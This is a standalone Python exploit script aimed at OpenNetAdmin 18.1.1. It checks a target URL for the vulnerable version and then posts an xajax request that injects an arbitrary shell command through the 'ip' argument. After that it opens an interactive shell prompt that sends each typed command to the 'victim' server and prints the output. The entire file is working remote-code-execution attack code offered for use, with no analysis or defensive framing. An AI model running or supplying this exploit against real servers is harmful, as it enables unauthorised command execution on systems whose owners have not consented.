import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

class OpenNetAdminRCE:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    def __init__(self, url):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.session = requests.Session()

    def is_vuln(self):
        print (LogColors.BLUE + "check is vuln..." + LogColors.ENDC)
        try:
            r = self.session.get(self.url, headers = self.headers, verify = False)
            if r.ok and "18.1.1" in r.text:
                print (LogColors.GREEN + "is vulnerable :)" + LogColors.ENDC)
                return True
            else:
                print (LogColors.RED + "is not vulnerable :(" + LogColors.ENDC)
                return False
        except:
            print (LogColors.RED + "cannot connect to the target :(" + LogColors.ENDC)
            sys.exit()

    def exploit(self, cmd):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        payload = {
            'xajax' : 'window_submit',
            'xajaxr' : '1574117726710',
            'xajaxargs[]' : ['tooltips','ip=>;echo \"BEGIN\";{} 2>&1;echo \"END\"'.format(cmd),'ping']
        }
        try:
            r = self.session.post(
                url,
                data = payload, headers = self.headers, verify = False
            )
            if r.ok:
                good = r.text
                # print (LogColors.YELLOW + "server response:" + LogColors.ENDC)
                # print (LogColors.YELLOW + good + LogColors.ENDC)
                result = good[good.find('BEGIN') + 6 : good.find('END') - 1]
                print (LogColors.YELLOW + str(result) + LogColors.ENDC)
                print (LogColors.GREEN + "successful send payload. hacked :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
        except:
            print (LogColors.RED + "failed connect to victim :(" + LogColors.ENDC)
            sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target victim url")
    args = vars(parser.parse_args())
    url = args['url']
    cve = OpenNetAdminRCE(url)
    if cve.is_vuln():
        cve.exploit(cmd = "whoami")
        cmd = ''
        while True:
            cmd = input('sh$ ').lower()
            if (cmd == 'exit'):
                sys.exit(0)
            cve.exploit(cmd)
            #print(cve.exploit(cmd))

